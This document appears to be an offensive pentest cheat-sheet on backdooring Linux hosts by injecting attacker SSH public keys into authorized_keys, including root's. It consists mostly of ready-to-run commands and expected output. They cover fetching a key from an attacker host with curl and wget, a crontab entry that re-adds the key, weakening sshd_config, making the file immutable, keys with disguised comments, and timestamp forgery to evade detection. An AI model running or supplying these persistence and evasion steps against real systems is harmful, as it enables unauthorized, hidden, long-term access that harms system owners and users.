# SSH

### Overview

**SSH Public Key Authentication Exploitation** abuses write access to SSH configuration files to establish passwordless authentication. When attackers can modify `.ssh/authorized_keys` or related SSH files, they can inject their own public keys to gain persistent access as any user, including root.

**Key Concepts:**

* **Public Key Authentication** - SSH authentication using cryptographic key pairs
* **authorized\_keys** - File containing public keys allowed to authenticate
* **Private Key** - Secret key kept by client for authentication
* **Public Key** - Shared key placed on server for verification
* **Key-based Login** - Passwordless SSH access using key pairs

**Attack Requirements:**

* Write access to user's `.ssh/authorized_keys` file
* SSH service running on target
* Ability to connect to SSH port (usually 22)

***

### Exploitation Workflow Summary

1. Key Generation (Attacker) ├─ Generate SSH key pair ├─ Extract public key └─ Prepare for transfer
2. Key Injection (Target) ├─ Verify write access to .ssh directory ├─ Create .ssh directory if needed ├─ Inject public key to authorized\_keys └─ Set correct permissions
3. Authentication (Attacker) ├─ Set private key permissions ├─ Connect using private key └─ Verify successful authentication

***

### Method 1: Basic Key Injection

**On attacker machine - Generate key pair:**

```bash
ssh-keygen -f key
```

**Expected output:**

```
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): [Press Enter]
Enter same passphrase again: [Press Enter]
Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:abcd1234efgh5678ijkl9012mnop3456 attacker@kali
```

**View public key:**

```bash
cat key.pub
```

**Expected output:**

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5... attacker@kali
```

**On target machine - Inject public key:**

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5... attacker@kali' >> ~/.ssh/authorized_keys
```

**Set correct permissions:**

```bash
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

**On attacker machine - Connect:**

```bash
chmod 600 key
ssh user@target-ip -i key
```

**Expected result:**

```bash
user@target:~$
```

***

### Method 2: Root Access via authorized\_keys

**If you have write access to root's SSH directory:**

**On target:**

```bash
# Check access
ls -la /root/.ssh/

# Inject key
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5... attacker@kali' >> /root/.ssh/authorized_keys

# Fix permissions
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

**On attacker:**

```bash
ssh root@target-ip -i key
```

**Expected result:**

```bash
root@target:~#
```

***

### Method 3: Creating .ssh Directory

**If .ssh directory doesn't exist:**

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@kali' > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Verify setup:**

```bash
ls -la ~/.ssh/
```

**Expected output:**

```
drwx------ 2 user user 4096 Dec 20 10:00 .
drwxr-xr-x 5 user user 4096 Dec 20 09:30 ..
-rw------- 1 user user  398 Dec 20 10:00 authorized_keys
```

***

### Method 4: Multiple Key Injection

**Add multiple keys (backdoor persistence):**

```bash
cat << EOF >> ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... key1@attacker
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... key2@backup
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... key3@persist
EOF
```

**Why multiple keys:**

* Redundancy if one key is removed
* Different keys for different access methods
* Harder to detect all backdoors

***

### Method 5: Key Generation Alternatives

**Generate ED25519 key (modern, more secure):**

```bash
ssh-keygen -t ed25519 -f key
```

**Generate key without passphrase (non-interactive):**

```bash
ssh-keygen -t rsa -f key -N ''
```

**Generate key with custom comment:**

```bash
ssh-keygen -t rsa -f key -C "legitimate-service"
```

***

### Advanced Techniques

**Inject key via command injection:**

```bash
# If you have command execution but limited shell
curl http://attacker-ip/key.pub | tee -a ~/.ssh/authorized_keys

# Or
wget http://attacker-ip/key.pub -O - >> ~/.ssh/authorized_keys
```

**Base64 transfer (no network):**

```bash
# On attacker
cat key.pub | base64

# On target
echo '[BASE64_STRING]' | base64 -d >> ~/.ssh/authorized_keys
```

**Via writable cron job:**

```bash
# Add to cron
echo "* * * * * echo 'ssh-rsa AAAA...' >> /home/user/.ssh/authorized_keys" >> /etc/crontab
```

***

### SSH Configuration Exploitation

**Modify sshd\_config for easier access:**

**If writable:**

```bash
# Enable root login
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# Enable password authentication (if disabled)
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Restart SSH
systemctl restart sshd
```

***

### Persistence Techniques

**Hide key in authorized\_keys:**

```bash
# Add legitimate-looking comment
echo 'ssh-rsa AAAAB3... backup-service@internal' >> ~/.ssh/authorized_keys
```

**Immutable attribute (if you have root):**

```bash
chattr +i ~/.ssh/authorized_keys
# Now file cannot be modified or deleted without removing attribute
```

**Backup key location:**

```bash
# Also add to root if you have access
echo 'ssh-rsa AAAAB3...' >> /root/.ssh/authorized_keys
```

***

### Connection Options

**Connect with specific port:**

```bash
ssh user@target-ip -i key -p 2222
```

**Connect with verbose output (debugging):**

```bash
ssh user@target-ip -i key -v
```

**Connect through proxy:**

```bash
ssh user@target-ip -i key -o ProxyCommand="nc -X connect -x proxy:8080 %h %p"
```

**Disable host key checking (lab environments):**

```bash
ssh user@target-ip -i key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
```

***

### Detection Evasion

**Match existing key format:**

```bash
# Check existing keys
cat ~/.ssh/authorized_keys

# Generate matching type
ssh-keygen -t rsa -b 2048 -f key  # If existing keys are RSA 2048
```

**Timestamp manipulation:**

```bash
# After injecting key, match timestamps
touch -r ~/.bashrc ~/.ssh/authorized_keys
```

***

### Troubleshooting

**Connection refused:**

```bash
# Check SSH service
systemctl status sshd

# Check firewall
iptables -L | grep 22

# Test from target
telnet localhost 22
```

**Permission denied (publickey):**

```bash
# On target, check permissions
ls -la ~/.ssh/
# Should be: drwx------ (700)

ls -la ~/.ssh/authorized_keys
# Should be: -rw------- (600)

# Fix permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

**Key not accepted:**

```bash
# Verify key format
cat ~/.ssh/authorized_keys
# Should start with: ssh-rsa, ssh-ed25519, etc.

# Check for extra whitespace
cat -A ~/.ssh/authorized_keys

# Regenerate if needed
ssh-keygen -f key -N ''
```

**SELinux blocking:**

```bash
# Check SELinux status
getenforce

# If Enforcing, set correct context
restorecon -Rv ~/.ssh
```

***

### Quick Reference

**Generate key pair:**

```bash
ssh-keygen -f key -N ''
cat key.pub
```

**Inject key:**

```bash
echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

**Connect:**

```bash
chmod 600 key
ssh user@target-ip -i key
```

**For root:**

```bash
echo 'ssh-rsa AAAAB3...' >> /root/.ssh/authorized_keys
ssh root@target-ip -i key
```
